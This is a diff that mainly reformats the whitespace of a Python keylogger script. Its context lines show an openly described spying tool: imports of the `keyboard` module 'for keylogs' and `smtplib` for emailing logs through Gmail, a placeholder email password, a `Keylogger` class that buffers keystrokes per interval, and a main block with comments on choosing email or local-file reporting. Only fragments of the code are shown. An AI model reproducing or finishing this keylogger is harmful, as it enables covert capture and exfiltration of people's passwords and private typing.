@@ -1,5 +1,5 @@
-import keyboard # for keylogs
-import smtplib # for sending email using SMTP protocol (gmail)
+import keyboard  # for keylogs
+import smtplib  # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
@@ -14,12 +14,13 @@ EMAIL_PASSWORD = "thisisafakepassword"
 
 start_time = time.time()
 
+
 class Keylogger:
     def __init__(self, interval, report_method="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
-        # this is the string variable that contains the log of all 
+        # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
@@ -57,7 +58,8 @@ class Keylogger:
 
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        start_dt_str = str(self.start_dt)[
+            :-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         Path(f"./logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
         self.filename = f"./logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
@@ -121,10 +123,11 @@ class Keylogger:
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
+
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
+    # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
